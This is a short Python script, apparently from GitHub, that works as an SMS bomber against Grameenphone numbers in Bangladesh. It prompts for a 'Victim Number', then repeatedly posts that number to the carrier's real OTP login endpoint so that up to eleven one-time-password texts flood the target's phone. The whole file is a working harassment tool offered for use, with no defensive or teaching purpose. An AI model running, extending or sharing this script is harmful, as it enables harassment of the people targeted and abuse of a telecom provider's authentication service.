import requests,json,sys,os
#from concurrent.futures import ThreadPoolExecutor as trad

class gp():
    def __init__(self):
        os.system('clear')
        print('\t GITHUB : \x1b[1;92mgithub.com/hasan1818666891\x1b[0m')
        print('\t     ONLY GRAMEENPHONE SIM')
        print('\t          ONLY FOR BD') 
        print('\t ===================================\n\n')
        self.target=a=input('  \x1b[0m[*] Enter Victim Number (017xxxxxxxx) : \x1b[1;92m')
        loop=input('  \x1b[0m[*] How many SMS you want to sent (max:11): \x1b[1;92m') # After sending 11 SMS Your Code will blocked
        print()
        l=0
        #with trad(max_workers=5) as sess:
        for i in range(int(loop)):
            self.gp_otp()
            sys.stdout.write(f'\r\t\t   \x1b[1;0m[\x1b[1;92m {l} \x1b[1;0mSMS sent. ]\r');sys.stdout.flush()
            l+=1
    def gp_otp(self):
        self.ses=requests.Session()
        self.ses.get('https://www.grameenphone.com/')
        req=self.ses.post('https://weblogin.grameenphone.com/backend/api/v1/otp',headers={
    "User-Agent": "MyGP/5.0",
        },data={
            "msisdn":f"{self.target}"
                }).json();print('\x1b[0m'+str(req));self.ses.close()
gp()